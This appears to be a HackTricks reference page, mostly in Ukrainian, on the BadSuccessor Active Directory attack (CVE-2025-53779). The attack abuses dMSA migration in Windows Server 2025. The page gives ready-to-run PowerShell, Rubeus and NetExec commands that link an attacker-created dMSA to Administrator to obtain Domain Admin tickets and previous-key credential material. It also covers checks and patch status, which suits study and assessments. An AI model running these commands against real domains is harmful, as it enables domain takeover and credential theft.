# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** зловживає робочим процесом міграції **delegated Managed Service Account** (**dMSA**), який було представлено у **Windows Server 2025**. dMSA можна прив’язати до застарілого облікового запису через **`msDS-ManagedAccountPrecededByLink`** і перевести через стани міграції, що зберігаються в **`msDS-DelegatedMSAState`**. Якщо атакувальник може створити dMSA у writable OU і контролювати ці атрибути, KDC може видати квитки для керованого атакувальником dMSA з **authorization context** прив’язаного облікового запису.

На практиці це означає, що малопривілейований користувач, який має лише delegated OU rights, може створити новий dMSA, вказати його на `Administrator`, завершити стан міграції, а потім отримати TGT, чий PAC містить привілейовані групи, такі як **Domain Admins**.

## dMSA migration details that matter

- dMSA is a **Windows Server 2025** feature.
- `Start-ADServiceAccountMigration` встановлює міграцію в стан **started**.
- `Complete-ADServiceAccountMigration` встановлює міграцію в стан **completed**.
- `msDS-DelegatedMSAState = 1` означає, що міграцію розпочато.
- `msDS-DelegatedMSAState = 2` означає, що міграцію завершено.
- Під час легітимної міграції dMSA має прозоро замінити обліковий запис, що був витіснений, тому KDC/LSA зберігають доступ, який уже мав попередній обліковий запис.

Microsoft Learn також зазначає, що під час міграції оригінальний обліковий запис прив’язується до dMSA, і dMSA призначений отримувати доступ до того, до чого міг отримати доступ старий обліковий запис. Це і є припущення щодо безпеки, яким зловживає BadSuccessor.

## Requirements

1. Домен, де **dMSA exists**, що означає наявність підтримки **Windows Server 2025** на стороні AD.
2. Атакувальник може **create** об’єкти `msDS-DelegatedManagedServiceAccount` у певному OU або має еквівалентні широкі права на створення дочірніх об’єктів там.
3. Атакувальник може **write** відповідні атрибути dMSA або повністю контролює dMSA, який щойно створив.
4. Атакувальник може запитувати Kerberos tickets з доменно-joined контексту або через tunnel, який має доступ до LDAP/Kerberos.

### Practical checks

Найчистіший операторський сигнал — перевірити рівень domain/forest і переконатися, що середовище вже використовує новий Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Якщо ви бачите значення на кшталт `Windows2025Domain` і `Windows2025Forest`, розглядайте **BadSuccessor / dMSA migration abuse** як пріоритетну перевірку.

Ви також можете перерахувати writable OUs, делеговані для створення dMSA, за допомогою public tooling:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. Створіть dMSA в OU, де у вас є делеговані права create-child.
2. Встановіть **`msDS-ManagedAccountPrecededByLink`** на DN привілейованої цілі, наприклад `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Встановіть **`msDS-DelegatedMSAState`** на `2`, щоб позначити міграцію як завершену.
4. Запросіть TGT для нового dMSA та використайте повернутий ticket для доступу до привілейованих services.

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Приклади запитів на квитки / operational tooling:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Чому це більше, ніж privilege escalation

Під час легітимної міграції Windows також потрібно, щоб новий dMSA обробляв tickets, які були видані для попереднього account до cutover. Саме тому dMSA-related ticket material може включати **current** і **previous** keys у потоці **`KERB-DMSA-KEY-PACKAGE`**.

Для підробленої міграції під контролем attacker таку поведінку можна перетворити на:

- **Privilege escalation** шляхом успадкування privileged group SIDs у PAC.
- **Credential material exposure** тому що обробка previous-key може розкривати material, еквівалентний RC4/NT hash попередника, у вразливих workflows.

Це робить technique корисною і для прямого domain takeover, і для подальших операцій, таких як pass-the-hash або ширший credential compromise.

## Примітки щодо patch status

Початкова поведінка BadSuccessor **не є лише теоретичною проблемою preview 2025 року**. Microsoft присвоїла їй **CVE-2025-53779** і опублікувала security update у **August 2025**. Зберігайте цей attack у документації для:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Не припускайте, що domain на Windows Server 2025 вразливий лише тому, що існує dMSA; перевіряйте patch level і тестуйте обережно.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
